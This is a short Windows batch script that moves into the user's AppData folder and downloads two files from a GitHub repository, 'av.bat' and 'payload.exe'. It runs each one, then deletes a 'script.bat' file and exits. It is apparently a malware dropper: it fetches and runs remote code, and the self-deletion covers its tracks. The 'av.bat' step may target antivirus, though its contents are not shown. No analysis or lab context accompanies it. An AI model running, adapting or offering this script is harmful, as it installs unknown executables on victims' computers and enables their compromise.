cd %appdata% && curl -LJO https://github.com/ishanarya24/dc/av.bat
cmd /c av.bat
timeout 13
cd %appdata% && curl -LJO https://github.com/ishanarya24/dc/payload.exe
cmd /c payload.exe
cd %appdata% && DEL script.bat && EXIT
